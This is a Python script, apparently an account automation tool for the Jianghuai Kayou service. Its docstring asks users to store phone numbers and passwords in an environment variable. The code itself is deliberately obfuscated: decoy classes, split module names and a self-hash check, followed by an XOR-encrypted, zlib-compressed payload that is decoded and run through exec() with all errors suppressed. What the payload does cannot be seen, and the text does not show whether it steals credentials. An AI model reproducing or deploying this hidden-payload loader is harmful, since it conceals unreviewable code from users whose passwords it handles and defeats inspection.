"""
江淮卡友账号密码填入环境变量jyky，#号分割多账号&分割或新建同名变量,手机号#密码&手机号#密码"

"""


import random
_GARBAGE_1=len("self_check")
_GARBAGE_2=locals()
class UselessClass:
    def __init__(self,x):
        self.val=sum(range(x)) if x>0 else 0
    def __repr__(self):
        return f"UselessObj(val={self.val})"
def _check_integrity():
    try:
        h_mod_name="".join(['h','a','s','h','l','i','b'])
        hashlib=__import__(h_mod_name)
        expected_hash="e5fae5917f1fe62933a3da0ef0e7fb5adebf2adb53eba1de23c90c3d4f802d51"
        with open(__file__,'rb') as f:
            content=f.read()
        placeholder=b'e5fae5917f1fe62933a3da0ef0e7fb5adebf2adb53eba1de23c90c3d4f802d51'
        actual_content=content.replace(expected_hash.encode('utf-8'),placeholder)
        sha256_func=getattr(hashlib,'sha'+'256')
        current_hash=sha256_func(actual_content).hexdigest()
        if current_hash!=expected_hash:
            raise ValueError("Invalid script format or corrupted file.")
    except Exception as e:
        _ = 1/(1 if "corrupted" in str(e) else 0)
if UselessClass(5).val==10:
    _check_integrity()
_b64_name=''.join(chr(c) for c in [98,97,115,101,54,52])
_z_name="".join(['z','l','i','b'])
_h_name="hashlib"
_b=__import__(_b64_name)
_z=__import__(_z_name)
_h=__import__(_h_name)
_xor=lambda d,k:bytes([b^k[i%len(k)] for i,b in enumerate(d)])
_gk=lambda s:getattr(_h,'sha'+'256')(s).digest()
_payload_parts=['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','3Buv4ZrsWy0=']
_s="".join(_payload_parts)
_encoded_seed="YV92ZXJ5X3NlY3VyZV9hbmRfcmFuZG9tX3NlZWRfMTIzNDVfZmluYWw="
try:
    _seed_bytes=getattr(_b,'b64d'+'ecode')(_encoded_seed)
    _seed=_seed_bytes.decode('utf-8')
    _k=_gk(_seed.encode())
    _d_b64=getattr(_b,'b64'+'decode')(_s)
    _d_xor=_xor(_d_b64,_k)
    _decompressed=getattr(_z,'de'+'compress')(_d_xor)
    _final_code=_decompressed.decode('utf-8')
    execution_globals={'__name__':'__main__','__file__':__file__,}
    exec(_final_code,execution_globals)
except Exception as e:
    pass
